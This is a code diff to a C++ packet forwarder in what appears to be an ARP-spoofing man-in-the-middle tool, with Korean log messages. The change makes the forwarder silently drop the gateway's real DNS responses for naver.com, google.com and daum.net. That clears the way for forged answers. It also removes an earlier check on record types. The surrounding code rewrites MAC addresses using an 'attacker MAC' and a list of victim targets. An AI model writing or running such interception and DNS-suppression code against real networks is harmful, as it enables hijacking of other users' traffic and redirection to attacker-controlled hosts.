@@ -148,6 +148,48 @@ void PacketForwarder::forward_packet(const u_int8_t* packet_data, size_t packet_
     // MAC 주소 설정
     if (ip_equals(src_ip, spoofer->get_gateway_ip())) 
     {
+        // Check DNS response from gateway before setting MACs
+        if (ip->ip_p == IPPROTO_UDP) 
+        {
+            int ip_header_len = (ip->ip_vhl & 0x0f) * 4;
+            if (packet_len >= sizeof(struct ether_header) + ip_header_len + sizeof(udp_header)) 
+            {
+                udp_header* udp = (udp_header*)(new_packet + sizeof(struct ether_header) + ip_header_len);
+                u_int16_t sport = ntohs(udp->uh_sport);
+
+                // DNS response from gateway
+                if (sport == DNS_PORT) 
+                {
+                    uint8_t* dns_ptr = (uint8_t*)(new_packet + sizeof(struct ether_header) + ip_header_len + sizeof(udp_header));
+                    size_t dns_len = packet_len - (sizeof(struct ether_header) + ip_header_len + sizeof(udp_header));
+                    
+                    if (dns_len >= sizeof(dns_header)) 
+                    {
+                        dns_header* dns_hdr = (dns_header*)dns_ptr;
+                        if ((ntohs(dns_hdr->flags) & 0x8000))  // QR = 1 -> response
+                        {
+                            string domain = extract_domain_name(dns_ptr, dns_len);
+                            for (size_t i = 0; i < domain.size(); ++i) domain[i] = tolower(domain[i]);
+                            if (!domain.empty() && domain.back() == '.') domain.pop_back();
+                            
+                            cout << "DNS 응답 (서버 -> 클라이언트) 도메인: [" << domain << "]\n";
+                            
+                            // Check if the domain contains any of our target domains
+                            if (domain.find("naver.com") != string::npos ||
+                                domain.find("google.com") != string::npos ||
+                                domain.find("daum.net") != string::npos) 
+                            {
+                                cout << "게이트웨이 DNS 응답 (" << domain << ") DROP.\n";
+                                delete[] new_packet;
+                                return;  // Early return without forwarding
+                            }
+                        }
+                    }
+                }
+            }
+        }
+        
+        // Continue with normal packet processing if not dropped
         memcpy(eth->ether_shost, spoofer->get_attacker_mac(), 6);
         bool found = false;
         for (const auto& target : spoofer->get_targets()) 
@@ -164,7 +206,7 @@ void PacketForwarder::forward_packet(const u_int8_t* packet_data, size_t packet_
             delete[] new_packet;
             return;
         }
-    } 
+    }  
     else 
     {
         memcpy(eth->ether_shost, spoofer->get_attacker_mac(), 6);
@@ -221,52 +263,23 @@ void PacketForwarder::forward_packet(const u_int8_t* packet_data, size_t packet_
                 if (dns_len >= sizeof(dns_header)) 
                 {
                     dns_header* dns_hdr = (dns_header*)dns_ptr;
-                    if ((ntohs(dns_hdr->flags) & 0x8000))  // QR = 1 → 응답
+                    // Check if it's a response (QR flag set)
+                    if ((ntohs(dns_hdr->flags) & 0x8000))  
                     {
                         string domain = extract_domain_name(dns_ptr, dns_len);
+                        cout << "DNS 응답 (서버 -> 클라이언트) 도메인: [" << domain << "]\n";
+                        
                         for (size_t i = 0; i < domain.size(); ++i) domain[i] = tolower(domain[i]);
                         if (!domain.empty() && domain.back() == '.') domain.pop_back();
 
-                        bool should_spoof = (domain.find("naver.com") != string::npos ||
-                                            domain.find("google.com") != string::npos ||
-                                            domain.find("daum.net") != string::npos);
-
-                        if (should_spoof)
+                        // Directly check for target domains without checking record types
+                        if (domain.find("naver.com") != string::npos ||
+                            domain.find("google.com") != string::npos ||
+                            domain.find("daum.net") != string::npos) 
                         {
-                            // 응답 섹션 시작 위치로 이동
-                            uint8_t* current = dns_ptr + 12;
-                            while (*current != 0 && (current - dns_ptr) < dns_len) current += (*current) + 1;
-                            current += 5;  // null label + QTYPE(2) + QCLASS(2)
-
-                            bool found_blocked_type = false;
-                            int ancount = ntohs(dns_hdr->ancount);
-                            for (int i = 0; i < ancount && (current - dns_ptr) + 10 < dns_len; ++i)
-                            {
-                                if (current[0] == 0xC0) current += 2;
-                                else {
-                                    while (*current != 0 && (current - dns_ptr) < dns_len) current += (*current) + 1;
-                                    current += 1;
-                                }
-
-                                uint16_t answer_type = (current[0] << 8) | current[1];
-                                uint16_t rdlength = (current[8] << 8) | current[9];
-
-                                // A(1), CNAME(5), AAAA(28), HTTPS(65)
-                                if (answer_type == 1 || answer_type == 5 || answer_type == 28 || answer_type == 65) 
-                                {
-                                    found_blocked_type = true;
-                                    break;
-                                }
-
-                                current += 10 + rdlength;
-                            }
-
-                            if (found_blocked_type) 
-                            {
-                                cout << "게이트웨이 DNS 응답 (" << domain << ") DROP [A/CNAME/AAAA/HTTPS].\n";
-                                delete[] new_packet;
-                                return;
-                            }
+                            cout << "게이트웨이 DNS 응답 (" << domain << ") DROP.\n";
+                            delete[] new_packet;
+                            return;  // Drop immediately without forwarding
                         }
                     }
                 }
